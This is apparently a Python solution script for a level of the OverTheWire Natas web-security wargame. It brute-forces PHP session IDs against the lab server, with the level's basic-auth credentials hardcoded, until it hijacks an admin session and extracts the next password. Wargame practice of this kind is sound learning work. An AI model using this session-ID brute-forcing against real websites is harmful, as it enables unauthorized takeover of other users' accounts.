#!/usr/bin/env python3

import requests
import re

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

for session_id in range(1, 641):
    response = requests.get(url, cookies = { "PHPSESSID": str(session_id) }, auth = (username, password))
    content = response.text

    if("You are an admin" in content):
        print(re.findall('Password: (.*)</pre>', content)[0])
        # print(content)
        break
    # else:
        # print("trying", session_id)